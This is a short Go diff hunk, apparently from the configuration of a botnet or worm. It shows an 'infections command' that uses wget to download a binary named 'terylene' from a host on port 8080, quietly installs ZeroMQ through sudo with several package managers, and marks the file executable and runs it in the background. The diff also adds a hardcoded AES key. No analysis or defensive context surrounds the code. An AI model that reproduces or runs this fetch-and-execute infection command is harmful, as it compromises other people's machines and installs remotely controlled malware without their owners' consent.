@@ -26,4 +26,7 @@ var (
 
 	//infections command
 	Infcommand = "wget -O file http://%s:8080/terylene && export DEBIAN_FRONTEND=noninteractive || true && apt-get install -y libzmq3-dev || true && yes | sudo pacman -S zeromq || true && sudo dnf -y install zeromq || true && chmod +x file && ./file &"
+
+	//AES key MUST be 256 bits (32characters)
+	AESkey = "#+fjWvYgh_HK8hD!dR@NG'J{y0<xCWsW"
 )
